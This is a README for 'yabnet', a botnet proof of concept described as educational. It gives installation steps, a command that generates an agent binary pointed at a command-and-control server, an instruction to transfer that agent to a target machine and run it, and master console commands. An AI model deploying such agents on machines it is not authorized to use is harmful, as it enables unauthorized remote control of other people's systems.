# yabnet
Yet Another Botnet, PoC created for educational purposes only.

## Installation 

**Due to lazyness, yabnet currently requires to be installed in the /opt directory.**

`cd /opt`
`git clone https://github.com/choisg/yabnet.git`
`cd /opt/yabnet`
`chmod +x install.sh`
`./install.sh`

## Operation 

Currently, yabnet is under construction. That means yabnet is meant to work on localhost environment.

**Server setup**
`python3 /server/server.py`

**Agent setup**
`python3 ./agent/generator.py -i <server_ipaddress> -p <server_port>`
`Example) python3 ./agent/generator.py -i 192.168.204.128 -p 5000`

`<Transfer ./agent/dist/agent_deploy_staticx to the target machine and run it>`

**Master setup**
After server and the agent is setup, launch the master console.
`python3 /master/master.py`
`console# login -r localhost -u user -p pass`
`console# list` 

`< All master console commands have help flag>`
`Example) push -h`

